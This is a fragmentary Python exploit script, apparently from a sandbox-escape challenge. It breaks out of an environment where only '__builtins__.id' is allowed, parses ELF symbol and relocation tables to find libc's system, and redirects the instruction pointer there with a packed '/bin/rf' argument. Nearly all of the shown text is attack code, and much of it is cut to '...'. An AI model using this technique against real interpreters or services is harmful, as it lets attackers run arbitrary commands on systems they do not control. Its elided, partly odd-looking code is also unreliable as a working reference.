...
io = open.__self__
print('[*] Only __builtins__.id allowed')
PAGE_SIZE = 4096
SIZEOF_ELF64_SYM = 24
SIZEOF_PLT_STUB = 16
...
class Exploit:
    ...
    def find_system(self):
        ...
        if got is None or strtab is None or symtab is None or rela is None or             init is None:
...
e.set_rip(system, obj_refcount=u64(b'\x2e/bin/rf\x00'))
